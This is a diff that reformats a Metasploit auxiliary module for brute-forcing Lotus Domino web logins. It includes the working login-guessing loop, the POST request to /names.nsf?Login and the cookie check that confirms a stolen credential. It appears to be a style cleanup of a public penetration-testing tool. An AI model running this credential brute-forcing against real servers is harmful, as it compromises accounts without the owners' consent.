@@ -1,36 +1,30 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-
 
   def initialize
     super(
       'Name'           => 'Lotus Domino Brute Force Utility',
       'Description'    => 'Lotus Domino Authentication Brute Force Utility',
       'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
-
   end
 
-  def run_host(ip)
-
-    each_user_pass { |user, pass|
+  def run_host(_ip)
+    each_user_pass do |user, pass|
       do_login(user, pass)
-    }
-
+    end
   end
 
   def report_cred(opts)
@@ -60,20 +54,20 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def do_login(user=nil,pass=nil)
+  def do_login(user = nil, pass = nil)
     post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
     vprint_status("http://#{vhost}:#{rport} - Lotus Domino - Trying username:'#{user}' with password:'#{pass}'")
 
     begin
 
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => '/names.nsf?Login',
-        'data'    => post_data,
-      }, 20)
+                               'method' => 'POST',
+                               'uri'     => '/names.nsf?Login',
+                               'data'    => post_data
+                             }, 20)
 
-      if res and res.code == 302
-        if res.get_cookies.match(/DomAuthSessId=(.*);(.*)/i)
+      if res && (res.code == 302)
+        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i
           print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL login for '#{user}' : '#{pass}'")
           report_cred(
             ip: rhost,
@@ -97,8 +91,8 @@ class MetasploitModule < Msf::Auxiliary
         return :abort
       end
 
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      rescue ::Timeout::Error, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
 end
